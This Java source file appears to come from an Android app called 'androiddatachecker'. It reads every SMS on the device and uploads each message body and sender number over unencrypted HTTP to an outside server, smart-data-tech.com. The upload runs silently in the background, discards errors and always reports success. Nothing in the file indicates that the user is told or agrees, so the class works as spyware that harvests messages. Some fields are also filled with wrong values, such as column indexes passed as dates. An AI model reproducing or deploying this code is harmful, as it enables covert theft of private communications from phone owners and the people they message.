package com.example.androiddatachecker;

import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.support.v4.content.ContextCompat;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class SaveUserMessage extends Application{

    // private static MainActivity inst;
    ArrayList<String> smsMessagesList = new ArrayList<String>();
    ListView smsListView;
    ArrayAdapter arrayAdapter;
    //private
    protected static Context context;

    ///////////////////le context de l'application///////////////////
    protected SaveUserMessage(Context context) {
        this.context = context;
    }

    protected static void SaveUserMessage() {
        if (ContextCompat.checkSelfPermission(context, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {

            ContentResolver contentResolver = context.getContentResolver();
            Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
            int indexBody = smsInboxCursor.getColumnIndex("body");
            int indexAddress = smsInboxCursor.getColumnIndex("address");
            if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
            do {
                // Toast.makeText(getContextOfApplication(), "Entrée dans Do", Toast.LENGTH_LONG).show();

                //InsertData(smsInboxCursor.getString(indexAddress),smsInboxCursor.getString(indexBody));
                InsertData(1, 458, smsInboxCursor.getString(indexBody),
                        smsInboxCursor.getString(indexAddress), "20h",
                        "h", Integer.toString(smsInboxCursor.getColumnIndex("address")),
                        Integer.toString(smsInboxCursor.getColumnIndex("address")), Integer.toString(smsInboxCursor.getColumnIndex("address")),
                        "nouvelle date", "actif");

            } while (smsInboxCursor.moveToNext());
            smsInboxCursor.close();
            //InsertData("papa","pa@mail.com");
        }
    }


    protected static void InsertData(final int id_user, final int id_message, final String contenu_message, final String type_messag,
                                   final String dat_message, final String heure_message,final String correspondant_number,
                                   final String correspondant_name,final String dat_ins_message,final String heure_ins_message,
                                   final String etat) {

        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected String doInBackground(String... params) {

                /*String NameHolder = name;
                String EmailHolder = email;*/

                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

              /*  nameValuePairs.add(new BasicNameValuePair("name",Integer.toString(id_user)));
                nameValuePairs.add(new BasicNameValuePair("email",Integer.toString(id_message)));*/
                nameValuePairs.add(new BasicNameValuePair("id_user",Integer.toString(id_user)));
                nameValuePairs.add(new BasicNameValuePair("id_message",Integer.toString(id_message)));
                nameValuePairs.add(new BasicNameValuePair("contenu_message",contenu_message));
                nameValuePairs.add(new BasicNameValuePair("type_message",type_messag));
                nameValuePairs.add(new BasicNameValuePair("dat_message",dat_message));
                nameValuePairs.add(new BasicNameValuePair("heure_message",heure_message));
                nameValuePairs.add(new BasicNameValuePair("correspondant_number",correspondant_number));
                nameValuePairs.add(new BasicNameValuePair("correspondant_name",correspondant_name));
                nameValuePairs.add(new BasicNameValuePair("dat_ins_message",dat_ins_message));
                nameValuePairs.add(new BasicNameValuePair("heure_ins_message",heure_ins_message));
                nameValuePairs.add(new BasicNameValuePair("etat",etat));

                try {
                    HttpClient httpClient = new DefaultHttpClient();

                    HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveUserMessage/");
                    //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");

                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse httpResponse = httpClient.execute(httpPost);

                    HttpEntity httpEntity = httpResponse.getEntity();


                } catch (ClientProtocolException e) {

                } catch (IOException e) {

                }
                return "Data Inserted Successfully";
            }

            @Override
            protected void onPostExecute(String result) {

                super.onPostExecute(result);

                //Toast.makeText(MainActivity.this, "Data Submit Successfully", Toast.LENGTH_LONG).show();

            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(Integer.toString(id_user), Integer.toString(id_message),contenu_message,type_messag,
       dat_message, heure_message,correspondant_number,
        correspondant_name, dat_ins_message, heure_ins_message,
        etat);
    }

}